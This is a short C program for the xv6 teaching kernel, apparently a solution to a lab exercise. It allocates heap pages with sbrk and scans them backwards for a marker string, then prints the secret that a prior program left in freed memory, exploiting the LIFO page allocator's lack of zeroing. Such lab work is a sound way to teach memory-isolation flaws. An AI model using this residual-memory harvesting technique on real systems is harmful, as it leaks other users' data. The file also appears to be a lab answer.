#include "kernel/types.h"
#include "user/user.h"

/*
Reverse Memory Scan (LIFO Optimizer)
Why it's tested: The kernel's physical page allocator (kalloc.c) uses a 
free list that operates as a Stack (Last-In, First-Out). The last page secret.c freed 
is the first one sniffer gets. Scanning backwards can be significantly faster.
*/
int main(int argc, char *argv[]) {
  int size = 10 * 4096;
  char *mem = sbrk(size);
  if(mem == (char*)-1) exit(1);

  char *pattern = "This may help.";
  
  // Start from the END of the allocated memory and move backwards
  for(int i = size - 64; i >= 0; i--) {
    if(strcmp(mem + i, pattern) == 0) {
      printf("%s\n", mem + i + 16);
      exit(0);
    }
  }

  printf("sniffer: secret not found\n");
  exit(0);
}